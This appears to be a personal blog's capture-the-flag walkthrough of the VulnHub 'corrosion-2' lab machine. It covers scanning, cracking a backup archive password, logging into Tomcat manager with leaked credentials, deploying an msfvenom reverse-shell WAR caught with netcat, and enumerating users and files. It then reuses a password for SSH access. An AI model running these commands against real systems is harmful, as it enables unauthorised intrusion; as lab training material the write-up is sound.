@@ -1,0 +1,852 @@
+<meta charset="UTF-8">
+<link rel="stylesheet" href="../../../index.css"/>
+<link rel="stylesheet" href="../../../highlight/styles/monokai.min.css"/>
+<script src="../../../highlight/highlight.min.js"></script>
+<script>hljs.highlightAll();</script>
+
+<h1>/f0c1s/blog/sec/vulnhub/corrosion-2</h1>
+
+<p>
+    <a href="../../../index.html">/blog</a>
+    <a href="../../index.html">Security</a>
+    <a href="../index.html">VulnHub</a>
+    <a href="../../../sec/vulnhub/corrosion-2/corrosion-2.html">+ corrosion-2 - 2021.12.23 Thursday</a>
+</p>
+
+<h1 id="corrosion-2">corrosion-2</h1>
+<p><a href="http://www.vulnhub.com/entry/corrosion-2,745/">VulnHub</a> <a href="http://www.vulnhub.com/series/corrosion,491/">Series: Corrosion</a></p>
+<h2 id="description-on-vulnhub">Description on VulnHub</h2>
+<blockquote>
+<p>Difficulty: Medium</p>
+<p>Hint: Enumeration is key.</p>
+</blockquote>
+<figure>
+<img src="0.running-box.png" alt="" /><figcaption>0.running-box</figcaption>
+</figure>
+<h2 id="scanning">Scanning</h2>
+<pre class="shell"><code>hostname -I: 192.168.42.7 192.168.56.70 
+Thursday 23 December 2021 11:04:42 PM IST 2021.12.23 23:04:42
+f0c1s@kali:~/vuln-hubs/corrosion/2 $
+fping -aAqg 192.168.56.1/24                                        
+192.168.56.1
+192.168.56.2
+192.168.56.70
+192.168.56.81
+                                                                                                                                                                                                                                           
+
+
+hostname -I: 192.168.42.7 192.168.56.70 
+Thursday 23 December 2021 11:04:55 PM IST 2021.12.23 23:04:55
+f0c1s@kali:~/vuln-hubs/corrosion/2 $
+export RHOST=&quot;192.168.56.81&quot;
+export LHOST=&quot;192.168.56.70&quot;
+export LPORT=&quot;443&quot;
+                                                                                                                                                                                                                                           
+
+
+hostname -I: 192.168.42.7 192.168.56.70 
+Thursday 23 December 2021 11:05:01 PM IST 2021.12.23 23:05:01
+f0c1s@kali:~/vuln-hubs/corrosion/2 $
+_n $RHOST  
+firing nmap 192.168.56.81 | tee nmap.default.txt
+Starting Nmap 7.92 ( https://nmap.org ) at 2021-12-23 23:05 IST
+Nmap scan report for 192.168.56.81
+Host is up (0.00033s latency).
+Not shown: 997 closed tcp ports (conn-refused)
+PORT     STATE SERVICE
+22/tcp   open  ssh
+80/tcp   open  http
+8080/tcp open  http-proxy
+
+Nmap done: 1 IP address (1 host up) scanned in 0.42 seconds
+                                                                                                                                                                                                                                           
+
+
+hostname -I: 192.168.42.7 192.168.56.70 
+Thursday 23 December 2021 11:05:03 PM IST 2021.12.23 23:05:03
+f0c1s@kali:~/vuln-hubs/corrosion/2 $
+_ntd $RHOST
+firing nmap 192.168.56.81 -p- -Pn -A -T4 --min-rate=5000 -sVC | tee nmap.tcp-ports.deep.txt
+Starting Nmap 7.92 ( https://nmap.org ) at 2021-12-23 23:05 IST
+Nmap scan report for 192.168.56.81
+Host is up (0.00032s latency).
+Not shown: 65532 closed tcp ports (conn-refused)
+PORT     STATE SERVICE VERSION
+22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   3072 6a:d8:44:60:80:39:7e:f0:2d:08:2f:e5:83:63:f0:70 (RSA)
+|   256 f2:a6:62:d7:e7:6a:94:be:7b:6b:a5:12:69:2e:fe:d7 (ECDSA)
+|_  256 28:e1:0d:04:80:19:be:44:a6:48:73:aa:e8:6a:65:44 (ED25519)
+80/tcp   open  http    Apache httpd 2.4.41 ((Ubuntu))
+|_http-title: Apache2 Ubuntu Default Page: It works
+|_http-server-header: Apache/2.4.41 (Ubuntu)
+8080/tcp open  http    Apache Tomcat 9.0.53
+|_http-title: Apache Tomcat/9.0.53
+|_http-favicon: Apache Tomcat
+|_http-open-proxy: Proxy might be redirecting requests
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 9.33 seconds
+                                                                                                                                                                                                                                           
+
+
+hostname -I: 192.168.42.7 192.168.56.70 
+Thursday 23 December 2021 11:05:15 PM IST 2021.12.23 23:05:15
+f0c1s@kali:~/vuln-hubs/corrosion/2 $
+sudo nmap $RHOST -n -p22,80,8080 -Pn -T4 --min-rate=5000 --top-ports=100 -sVC -A --script=*enum* | tee nmap.deep-enum.txt
+[sudo] password for f0c1s: 
+Starting Nmap 7.92 ( https://nmap.org ) at 2021-12-23 23:05 IST
+Nmap scan report for 192.168.56.81
+Host is up (0.00078s latency).
+
+PORT     STATE SERVICE VERSION
+22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
+| ssh2-enum-algos: 
+|   kex_algorithms: (9)
+|       curve25519-sha256
+|       curve25519-sha256@libssh.org
+|       ecdh-sha2-nistp256
+|       ecdh-sha2-nistp384
+|       ecdh-sha2-nistp521
+|       diffie-hellman-group-exchange-sha256
+|       diffie-hellman-group16-sha512
+|       diffie-hellman-group18-sha512
+|       diffie-hellman-group14-sha256
+|   server_host_key_algorithms: (5)
+|       rsa-sha2-512
+|       rsa-sha2-256
+|       ssh-rsa
+|       ecdsa-sha2-nistp256
+|       ssh-ed25519
+|   encryption_algorithms: (6)
+|       chacha20-poly1305@openssh.com
+|       aes128-ctr
+|       aes192-ctr
+|       aes256-ctr
+|       aes128-gcm@openssh.com
+|       aes256-gcm@openssh.com
+|   mac_algorithms: (10)
+|       umac-64-etm@openssh.com
+|       umac-128-etm@openssh.com
+|       hmac-sha2-256-etm@openssh.com
+|       hmac-sha2-512-etm@openssh.com
+|       hmac-sha1-etm@openssh.com
+|       umac-64@openssh.com
+|       umac-128@openssh.com
+|       hmac-sha2-256
+|       hmac-sha2-512
+|       hmac-sha1
+|   compression_algorithms: (2)
+|       none
+|_      zlib@openssh.com
+80/tcp   open  http    Apache httpd 2.4.41 ((Ubuntu))
+|_http-server-header: Apache/2.4.41 (Ubuntu)
+8080/tcp open  http    Apache Tomcat 9.0.53
+| http-enum: 
+|   /backup.zip: Possible backup
+|   /examples/: Sample scripts
+|   /manager/html/upload: Apache Tomcat (401 )
+|   /manager/html: Apache Tomcat (401 )
+|_  /docs/: Potentially interesting folder
+MAC Address: 08:00:27:D7:4E:FA (Oracle VirtualBox virtual NIC)
+Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
+Device type: general purpose
+Running: Linux 4.X|5.X
+OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5
+OS details: Linux 4.15 - 5.6
+Network Distance: 1 hop
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+TRACEROUTE
+HOP RTT     ADDRESS
+1   0.78 ms 192.168.56.81
+
+OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 11.88 seconds</code></pre>
+<h2 id="attacking-web">Attacking web</h2>
+<h3 id="browsing">Browsing</h3>
+<figure>
+<img src="1.homepage-port80.png" alt="" /><figcaption>1.homepage-port80</figcaption>
+</figure>
+<figure>
+<img src="2.homepage-port8080.png" alt="" /><figcaption>2.homepage-port8080</figcaption>
+</figure>
+<pre class="shell"><code>nikto -C all -host http://$RHOST         
+- Nikto v2.1.6
+---------------------------------------------------------------------------
++ Target IP:          192.168.56.81
++ Target Hostname:    192.168.56.81
++ Target Port:        80
++ Start Time:         2021-12-23 23:06:27 (GMT5.5)
+---------------------------------------------------------------------------
++ Server: Apache/2.4.41 (Ubuntu)
++ The anti-clickjacking X-Frame-Options header is not present.
++ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS
++ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type
++ Server may leak inodes via ETags, header found with file /, inode: 2aa6, size: 5cc2a3672a871, mtime: gzip
++ Allowed HTTP Methods: GET, POST, OPTIONS, HEAD 
++ 26522 requests: 0 error(s) and 5 item(s) reported on remote host
++ End Time:           2021-12-23 23:07:08 (GMT5.5) (41 seconds)
+---------------------------------------------------------------------------
++ 1 host(s) tested</code></pre>
+<pre class="shell"><code>nikto -C all -host http://$RHOST:8080                
+- Nikto v2.1.6
+---------------------------------------------------------------------------
++ Target IP:          192.168.56.81
++ Target Hostname:    192.168.56.81
++ Target Port:        8080
++ Start Time:         2021-12-23 23:06:38 (GMT5.5)
+---------------------------------------------------------------------------
++ Server: No banner retrieved
++ The anti-clickjacking X-Frame-Options header is not present.
++ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS
++ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type
++ /backup.zip: Potentially interesting archive/cert file found.
++ /backup.zip: Potentially interesting archive/cert file found. (NOTE: requested by IP address).
++ OSVDB-39272: /favicon.ico file identifies this app/server as: Apache Tomcat (possibly 5.5.26 through 8.0.15), Alfresco Community
++ Allowed HTTP Methods: GET, HEAD, POST, PUT, DELETE, OPTIONS 
++ OSVDB-397: HTTP method (&#39;Allow&#39; Header): &#39;PUT&#39; method could allow clients to save files on the web server.
++ OSVDB-5646: HTTP method (&#39;Allow&#39; Header): &#39;DELETE&#39; may allow clients to remove files on the web server.
++ /examples/servlets/index.html: Apache Tomcat default JSP pages present.
++ OSVDB-3720: /examples/jsp/snp/snoop.jsp: Displays information about page retrievals, including other users.
++ OSVDB-3092: /readme.txt: This might be interesting...
++ /manager/html: Default Tomcat Manager / Host Manager interface found
++ /host-manager/html: Default Tomcat Manager / Host Manager interface found
++ /manager/status: Default Tomcat Server Status interface found
++ /host-manager/status: Default Tomcat Server Status interface found
++ 26676 requests: 0 error(s) and 16 item(s) reported on remote host
++ End Time:           2021-12-23 23:07:20 (GMT5.5) (42 seconds)
+---------------------------------------------------------------------------
++ 1 host(s) tested</code></pre>
+<p><code>/backup.zip</code> is interesting</p>
+<h2 id="backup.zip">backup.zip</h2>
+<pre class="shell"><code>hostname -I: 192.168.42.7 192.168.56.70 
+Thursday 23 December 2021 11:07:20 PM IST 2021.12.23 23:07:20
+f0c1s@kali:~/vuln-hubs/corrosion/2 $
+wget -q $RHOST:8080/backup.zip
+                                                                                                                   
+
+
+hostname -I: 192.168.42.7 192.168.56.70 
+Thursday 23 December 2021 11:08:44 PM IST 2021.12.23 23:08:44
+f0c1s@kali:~/vuln-hubs/corrosion/2 $
+ls -la backup.zip     
+-rw-r--r-- 1 f0c1s f0c1s 33723 Sep 17 09:45 backup.zip
+                                                                                                                   
+
+
+hostname -I: 192.168.42.7 192.168.56.70 
+Thursday 23 December 2021 11:08:47 PM IST 2021.12.23 23:08:47
+f0c1s@kali:~/vuln-hubs/corrosion/2 $
+unzip backup.zip -d backup          
+Archive:  backup.zip
+[backup.zip] catalina.policy password: 
+   skipping: catalina.policy         incorrect password
+   skipping: context.xml             incorrect password
+   skipping: catalina.properties     incorrect password
+   skipping: jaspic-providers.xml    incorrect password
+   skipping: jaspic-providers.xsd    incorrect password
+   skipping: logging.properties      incorrect password
+   skipping: server.xml              incorrect password
+   skipping: tomcat-users.xml        incorrect password
+   skipping: tomcat-users.xsd        incorrect password
+   skipping: web.xml                 incorrect password
+                                                                                                                   
+
+
+hostname -I: 192.168.42.7 192.168.56.70 
+Thursday 23 December 2021 11:09:01 PM IST 2021.12.23 23:09:01
+f0c1s@kali:~/vuln-hubs/corrosion/2 $
+fcrackzip -D -p /usr/share/wordlists/rockyou.txt -u backup.zip      
+
+
+PASSWORD FOUND!!!!: pw == @administrator_hi5
+                                                                                                                   
+
+
+hostname -I: 192.168.42.7 192.168.56.70 
+Thursday 23 December 2021 11:09:16 PM IST 2021.12.23 23:09:16
+f0c1s@kali:~/vuln-hubs/corrosion/2 $
+unzip backup.zip -d backup                                    
+Archive:  backup.zip
+[backup.zip] catalina.policy password: 
+  inflating: backup/catalina.policy  
+  inflating: backup/context.xml      
+  inflating: backup/catalina.properties  
+  inflating: backup/jaspic-providers.xml  
+  inflating: backup/jaspic-providers.xsd  
+  inflating: backup/logging.properties  
+  inflating: backup/server.xml       
+  inflating: backup/tomcat-users.xml  
+  inflating: backup/tomcat-users.xsd  
+  inflating: backup/web.xml</code></pre>
+<figure>
+<img src="3.backup-zip.png" alt="" /><figcaption>3.backup-zip</figcaption>
+</figure>
+<figure>
+<img src="4.finding-passwords.png" alt="" /><figcaption>4.finding-passwords</figcaption>
+</figure>
+<pre class="shell"><code>grep -Hnri password .                     
+./tomcat-users.xsd:45:            &lt;xs:attribute name=&quot;password&quot; type=&quot;xs:string&quot; /&gt;
+./tomcat-users.xml:25:  you must define such a user - the username and password are arbitrary.
+./tomcat-users.xml:36:  will also need to set the passwords to something appropriate.
+./tomcat-users.xml:39:  &lt;user username=&quot;admin&quot; password=&quot;&lt;must-be-changed&gt;&quot; roles=&quot;manager-gui&quot;/&gt;
+./tomcat-users.xml:40:  &lt;user username=&quot;robot&quot; password=&quot;&lt;must-be-changed&gt;&quot; roles=&quot;manager-script&quot;/&gt;
+./tomcat-users.xml:47:  them. You will also need to set the passwords to something appropriate.
+./tomcat-users.xml:52:  &lt;user username=&quot;tomcat&quot; password=&quot;&lt;must-be-changed&gt;&quot; roles=&quot;tomcat&quot;/&gt;
+./tomcat-users.xml:53:  &lt;user username=&quot;both&quot; password=&quot;&lt;must-be-changed&gt;&quot; roles=&quot;tomcat,role1&quot;/&gt;
+./tomcat-users.xml:54:  &lt;user username=&quot;role1&quot; password=&quot;&lt;must-be-changed&gt;&quot; roles=&quot;role1&quot;/&gt;
+./tomcat-users.xml:59:&lt;user username=&quot;manager&quot; password=&quot;melehifokivai&quot; roles=&quot;manager-gui&quot;/&gt;
+./tomcat-users.xml:62:&lt;user username=&quot;admin&quot; password=&quot;melehifokivai&quot; roles=&quot;admin-gui, manager-gui&quot;/&gt;
+./server.xml:141:      &lt;!-- Use the LockOutRealm to prevent attempts to guess user passwords
+</code></pre>
+<p><code>manager:melehifokivai</code> works on <code>http://192.168.56.81:8080/manager/html</code></p>
+<figure>
+<img src="5.it-has-been-so-long-since-last-msfvenom.png" alt="" /><figcaption>5.it-has-been-so-long-since-last-msfvenom</figcaption>
+</figure>
+<pre class="shell"><code>msfvenom -p linux/x64/shell_reverse_tcp LHOST=192.168.56.70 LPORT=443 -f war --platform linux -a x64 -o wsrt443.war | tee msfvenom.wsrt443.txt
+No encoder specified, outputting raw payload
+Payload size: 74 bytes
+Final size of war file: 1567 bytes
+Saved as: wsrt443.war</code></pre>
+<pre class="shell"><code>unzip -l wsrt443.war                
+Archive:  wsrt443.war
+  Length      Date    Time    Name
+---------  ---------- -----   ----
+        0  2021-12-23 23:17   META-INF/
+       71  2021-12-23 23:17   META-INF/MANIFEST.MF
+        0  2021-12-23 23:17   WEB-INF/
+      272  2021-12-23 23:17   WEB-INF/web.xml
+     1864  2021-12-23 23:17   feermcdrmia.jsp
+---------                     -------
+     2207                     5 files</code></pre>
+<h2 id="reverse-shell">Reverse shell</h2>
+<p>Visit: <code>http://192.168.56.81:8080/wsrt443/feermcdrmia.jsp</code></p>
+<figure>
+<img src="6.caught-a-reverse-shell.png" alt="" /><figcaption>6.caught-a-reverse-shell</figcaption>
+</figure>
+<pre class="shell"><code>hostname -I: 192.168.42.7 192.168.56.70 
+Thursday 23 December 2021 11:19:17 PM IST 2021.12.23 23:19:17
+f0c1s@kali:~/vuln-hubs/corrosion/2 $
+sudo nc -nlvp $LPORT -s $LHOST 
+Listening on 192.168.56.70 443
+Connection received on 192.168.56.81 47658
+whoami
+tomcat
+id
+uid=1001(tomcat) gid=1001(tomcat) groups=1001(tomcat)
+hostname
+corrosion
+date
+Thu Dec 23 16:19:37 MST 2021
+</code></pre>
+<h3 id="backups">Backups</h3>
+<pre class="shell"><code>find / -type f -name &quot;*bak&quot; -not -path &quot;/snap/*&quot; -exec ls -lh &quot;{}&quot; \; 2&gt;/dev/null
+# nothing
+find / -type f -name &quot;*backup*&quot; -not -path &quot;/snap/*&quot; -not -path &quot;/usr/*&quot; -not -path &quot;/var/*&quot; 2&gt;/dev/null
+/opt/tomcat/webapps/ROOT/backup.zip</code></pre>
+<p>I can also look for SUID binaries, but I think that would not help like it didn’t in <a href="http://blog.f0c1s.com/sec/vulnhub/corrosion-1/corrosion-1.html">Corrosion 1</a>.</p>
+<h3 id="etcpasswd">/etc/passwd</h3>
+<pre class="shell"><code>tomcat@corrosion:/var/spool/cron$ cat /etc/passwd
+cat /etc/passwd
+root:x:0:0:root:/root:/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+bin:x:2:2:bin:/bin:/usr/sbin/nologin
+sys:x:3:3:sys:/dev:/usr/sbin/nologin
+sync:x:4:65534:sync:/bin:/bin/sync
+games:x:5:60:games:/usr/games:/usr/sbin/nologin
+man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
+lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
+mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
+news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
+uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
+proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
+www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
+backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
+list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
+irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
+gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
+nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
+systemd-network:x:100:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
+systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
+systemd-timesync:x:102:104:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
+messagebus:x:103:106::/nonexistent:/usr/sbin/nologin
+syslog:x:104:110::/home/syslog:/usr/sbin/nologin
+_apt:x:105:65534::/nonexistent:/usr/sbin/nologin
+tss:x:106:111:TPM software stack,,,:/var/lib/tpm:/bin/false
+uuidd:x:107:114::/run/uuidd:/usr/sbin/nologin
+tcpdump:x:108:115::/nonexistent:/usr/sbin/nologin
+avahi-autoipd:x:109:116:Avahi autoip daemon,,,:/var/lib/avahi-autoipd:/usr/sbin/nologin
+usbmux:x:110:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin
+rtkit:x:111:117:RealtimeKit,,,:/proc:/usr/sbin/nologin
+dnsmasq:x:112:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin
+cups-pk-helper:x:113:120:user for cups-pk-helper service,,,:/home/cups-pk-helper:/usr/sbin/nologin
+speech-dispatcher:x:114:29:Speech Dispatcher,,,:/run/speech-dispatcher:/bin/false
+avahi:x:115:121:Avahi mDNS daemon,,,:/var/run/avahi-daemon:/usr/sbin/nologin
+kernoops:x:116:65534:Kernel Oops Tracking Daemon,,,:/:/usr/sbin/nologin
+saned:x:117:123::/var/lib/saned:/usr/sbin/nologin
+nm-openvpn:x:118:124:NetworkManager OpenVPN,,,:/var/lib/openvpn/chroot:/usr/sbin/nologin
+hplip:x:119:7:HPLIP system user,,,:/run/hplip:/bin/false
+whoopsie:x:120:125::/nonexistent:/bin/false
+colord:x:121:126:colord colour management daemon,,,:/var/lib/colord:/usr/sbin/nologin
+geoclue:x:122:127::/var/lib/geoclue:/usr/sbin/nologin
+pulse:x:123:128:PulseAudio daemon,,,:/var/run/pulse:/usr/sbin/nologin
+gnome-initial-setup:x:124:65534::/run/gnome-initial-setup/:/bin/false
+gdm:x:125:130:Gnome Display Manager:/var/lib/gdm3:/bin/false
+sssd:x:126:131:SSSD system user,,,:/var/lib/sss:/usr/sbin/nologin
+randy:x:1000:1000:randy,,,:/home/randy:/bin/bash
+systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin
+tomcat:x:1001:1001::/home/tomcat:/bin/sh
+sshd:x:127:65534::/run/sshd:/usr/sbin/nologin
+jaye:x:1002:1002::/home/jaye:/bin/sh</code></pre>
+<h4 id="users-with-home-directory">Users with /home directory</h4>
+<pre class="shell"><code>tomcat@corrosion:/var/spool/cron$ cat /etc/passwd | grep -i &quot;/home&quot; | awk -F&#39;:&#39; &#39;{print $1}&#39;
+syslog
+cups-pk-helper
+randy
+tomcat
+jaye</code></pre>
+<h3 id="where-is-tomcat-serving-from">where is tomcat serving from?</h3>
+<pre class="shell"><code>tomcat@corrosion:/$ find / -type d -name tomcat 2&gt;/dev/null
+find / -type d -name tomcat 2&gt;/dev/null
+/opt/tomcat
+tomcat@corrosion:/$ cd /opt/tomcat
+cd /opt/tomcat
+tomcat@corrosion:/opt/tomcat$ ls
+ls
+BUILDING.txt     LICENSE  README.md      RUNNING.txt  conf  logs  webapps
+CONTRIBUTING.md  NOTICE   RELEASE-NOTES  bin          lib   temp  work
+tomcat@corrosion:/opt/tomcat$ ls -la
+ls -la
+total 160
+drwxr-Sr-- 10 tomcat tomcat  4096 Sep 17 01:03 .
+drwxr-xr-x  3 root   root    4096 Sep 16 22:00 ..
+drwx--S---  3 tomcat tomcat  4096 Sep 16 23:27 .local
+-rwx------  1 tomcat tomcat 18970 Sep  6 13:09 BUILDING.txt
+-rwx------  1 tomcat tomcat  6210 Sep  6 13:09 CONTRIBUTING.md
+-rwx------  1 tomcat tomcat 57092 Sep  6 13:09 LICENSE
+-rwx------  1 tomcat tomcat  2333 Sep 17 01:03 NOTICE
+-rwx------  1 tomcat tomcat  3372 Sep  6 13:09 README.md
+-rwx------  1 tomcat tomcat  6898 Sep  6 13:09 RELEASE-NOTES
+-rwx------  1 tomcat tomcat 16507 Sep 17 00:51 RUNNING.txt
+drwx--S---  2 tomcat tomcat  4096 Sep 16 22:00 bin
+drwx--S---  3 tomcat tomcat  4096 Sep 16 23:47 conf
+drwx--S---  2 tomcat tomcat  4096 Sep 16 22:00 lib
+drwx--S---  2 tomcat tomcat  4096 Dec 23 16:04 logs
+drwx--S---  2 tomcat tomcat  4096 Dec 23 16:19 temp
+drwx--S---  8 tomcat tomcat  4096 Dec 23 16:18 webapps
+drwx--S---  3 tomcat tomcat  4096 Sep 16 22:02 work</code></pre>
+<h3 id="home">/home</h3>
+<pre class="shell"><code>tomcat@corrosion:/opt/tomcat$ ls -lAhR /home
+ls -lAhR /home
+/home:
+total 8.0K
+drwxr-x--x 18 jaye  jaye  4.0K Sep 17 20:53 jaye
+dr-xr-xr-x 15 randy randy 4.0K Sep 20 19:57 randy
+ls: cannot open directory &#39;/home/jaye&#39;: Permission denied
+
+/home/randy:
+total 76K
+-rw-r--r--  1 root  root     0 Sep 17 20:28 .bash_history
+-rw-r--r--  1 randy randy  220 Sep 16 17:19 .bash_logout
+-rw-r--r--  1 randy randy 3.7K Sep 16 17:19 .bashrc
+drwxr-xr-x 12 randy randy 4.0K Sep 17 03:04 .cache
+drwx------ 10 randy randy 4.0K Sep 16 17:24 .config
+drwx------  3 randy randy 4.0K Sep 20 19:49 .gnupg
+drwxr-xr-x  3 randy randy 4.0K Sep 16 17:23 .local
+-rw-r--r--  1 randy randy  807 Sep 16 17:19 .profile
+drwx------  2 randy randy 4.0K Sep 17 02:01 .ssh
+-rw-r--r--  1 randy randy    0 Sep 16 21:57 .sudo_as_admin_successful
+drwxr-xr-x  2 randy randy 4.0K Sep 16 17:23 Desktop
+drwxr-xr-x  2 randy randy 4.0K Sep 16 17:23 Documents
+drwxr-xr-x  2 randy randy 4.0K Sep 16 17:23 Downloads
+drwxr-xr-x  2 randy randy 4.0K Sep 16 17:23 Music
+drwxr-xr-x  2 randy randy 4.0K Sep 16 17:23 Pictures
+drwxr-xr-x  2 randy randy 4.0K Sep 16 17:23 Public
+drwxr-xr-x  2 randy randy 4.0K Sep 16 17:23 Templates
+drwxr-xr-x  2 randy randy 4.0K Sep 16 17:23 Videos
+-rw-r--r--  1 root  root   283 Sep 20 19:56 note.txt
+-rwxr-xr-x  1 root  root   210 Sep 20 19:48 randombase64.py
+-rw-rw-r--  1 randy randy   33 Sep 17 02:09 user.txt
+</code></pre>
+<pre class="shell"><code>tomcat@corrosion:/home/randy$ cat note.txt
+cat note.txt
+Hey randy this is your system administrator, hope your having a great day! I just wanted to let you know
+that I changed your permissions for your home directory. You won&#39;t be able to remove or add files for now.
+
+I will change these permissions later on.
+
+See you next Monday randy!
+
+tomcat@corrosion:/home/randy$ cat user.txt
+cat user.txt
+ca73a018ae6908a7d0ea5d1c269ba4b6
+
+tomcat@corrosion:/home/randy$ cat randombase64.py
+cat randombase64.py
+import base64
+
+message = input(&quot;Enter your string: &quot;)
+message_bytes = message.encode(&#39;ascii&#39;)
+base64_bytes = base64.b64encode(message_bytes)
+base64_message = base64_bytes.decode(&#39;ascii&#39;)
+
+print(base64_message)</code></pre>
+<h3 id="flag-homerandyuser.txt">flag /home/randy/user.txt</h3>
+<pre class="shell"><code>tomcat@corrosion:/home/randy$ cat user.txt
+cat user.txt
+ca73a018ae6908a7d0ea5d1c269ba4b6
+</code></pre>
+<figure>
+<img src="7.flag-user.txt.png" alt="" /><figcaption>7.flag-user.txt</figcaption>
+</figure>
+<h3 id="linux-enumeration-scripts">linux enumeration scripts</h3>
+<pre class="shell"><code>python3 -m http.server 80                                                                                 
+Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
+192.168.56.81 - - [23/Dec/2021 23:37:16] &quot;GET /lse.sh HTTP/1.1&quot; 200 -
+192.168.56.81 - - [23/Dec/2021 23:37:16] &quot;GET /LinEnum.sh HTTP/1.1&quot; 200 -
+192.168.56.81 - - [23/Dec/2021 23:37:16] &quot;GET /linpeas.sh HTTP/1.1&quot; 200 -</code></pre>
+<h3 id="lse.sh">lse.sh</h3>
+<figure>
+<img src="8.lse-sh.png" alt="" /><figcaption>8.lse-sh</figcaption>
+</figure>
+<pre class="shell"><code>tomcat@corrosion:/tmp$ ls -lAh /opt/tomcat/webapps/ROOT/backup.zip
+ls -lAh /opt/tomcat/webapps/ROOT/backup.zip
+-rw-rw-r-- 1 tomcat tomcat 33K Sep 16 22:15 /opt/tomcat/webapps/ROOT/backup.zip
+</code></pre>
+<p>This is same size as what we downloaded earlier. This doesn’t seem to be it.</p>
+<h3 id="not-vulnerable-to-dirty_sock">not vulnerable to dirty_sock</h3>
+<figure>
+<img src="9.not-vulnerable-to-dirty-sock.png" alt="" /><figcaption>9.not-vulnerable-to-dirty-sock</figcaption>
+</figure>
+<h3 id="linenum.sh">LinEnum.sh</h3>
+<p><a href="1.out-linenum.sh.txt">Checkout 1.out-linenum.sh.txt</a></p>
+<figure>
+<img src="10.interesting-find.png" alt="" /><figcaption>10.interesting-find</figcaption>
+</figure>
+<pre class="shell"><code>### INTERESTING FILES ####################################
+[-] Useful file locations:
+/usr/bin/nc
+/usr/bin/netcat
+/usr/bin/wget
+
+[-] World-writable files (excluding /proc and /sys):
+-rwxrwxrwx 1 root root 20386 Sep 20 20:03 `/usr/lib/python3.8/base64.py`</code></pre>
+<h3 id="usrlibpython3.8base64">/usr/lib/python3.8/base64</h3>
+<p><a href="2.out-usr-lib-python38-base64.txt">Checkout 2.out-usr-lib-python38-base64.txt</a></p>
+<p>I cannot open this file in this terminal. nano and vi fail.</p>
+<h2 id="ssh-as-jaye">SSH as jaye</h2>
+<p>jaye:melehifokivai</p>
+<figure>
+<img src="11.ssh-as-jaye.png" alt="" /><figcaption>11.ssh-as-jaye</figcaption>
+</figure>
+<pre class="shell"><code>nano /usr/lib/python3.8/base64.py</code></pre>
+<p>Worked!</p>
+<figure>
+<img src="12.nano-opened-the-file.png" alt="" /><figcaption>12.nano-opened-the-file</figcaption>
+</figure>
+<p>It failed, will get back to it soon.</p>
+<pre class="shell"><code>$ python3 -c &#39;import pty; pty.spawn(&quot;/bin/bash&quot;)&#39;
+jaye@corrosion:~$ ls -la
+total 84
+drwxr-x--x 18 jaye jaye 4096 Sep 17 20:53 .
+drwxr-xr-x  4 root root 4096 Sep 17 01:37 ..
+-rw-r--r--  1 root root    0 Sep 17 03:09 .bash_history
+-rw-r--r--  1 jaye jaye  220 Feb 25  2020 .bash_logout
+-rw-r--r--  1 jaye jaye 3771 Feb 25  2020 .bashrc
+drwx------ 12 jaye jaye 4096 Sep 17 14:03 .cache
+drwx------ 11 jaye jaye 4096 Sep 17 21:54 .config
+drwxr-xr-x  2 jaye jaye 4096 Sep 17 13:08 Desktop
+drwxr-xr-x  2 jaye jaye 4096 Sep 17 13:08 Documents
+drwxr-xr-x  2 jaye jaye 4096 Sep 17 13:08 Downloads
+drwxr-xr-x  2 root root 4096 Sep 17 20:53 Files
+drwx------  3 jaye jaye 4096 Sep 17 20:48 .gnupg
+drwxr-xr-x  3 jaye jaye 4096 Sep 17 02:14 .local
+drwx------  5 jaye jaye 4096 Sep 17 14:03 .mozilla
+drwxr-xr-x  2 jaye jaye 4096 Sep 17 13:08 Music
+drwxr-xr-x  2 jaye jaye 4096 Sep 17 13:08 Pictures
+-rw-r--r--  1 jaye jaye  807 Feb 25  2020 .profile
+drwxr-xr-x  2 jaye jaye 4096 Sep 17 13:08 Public
+drwxr-xr-x  3 jaye jaye 4096 Sep 17 13:55 snap
+drwx------  2 jaye jaye 4096 Sep 17 13:09 .ssh
+drwxr-xr-x  2 jaye jaye 4096 Sep 17 13:08 Templates
+drwxr-xr-x  2 jaye jaye 4096 Sep 17 13:08 Videos
+
+jaye@corrosion:~/.ssh$ sudo -l
+[sudo] password for jaye: 
+Sorry, user jaye may not run sudo on corrosion.</code></pre>
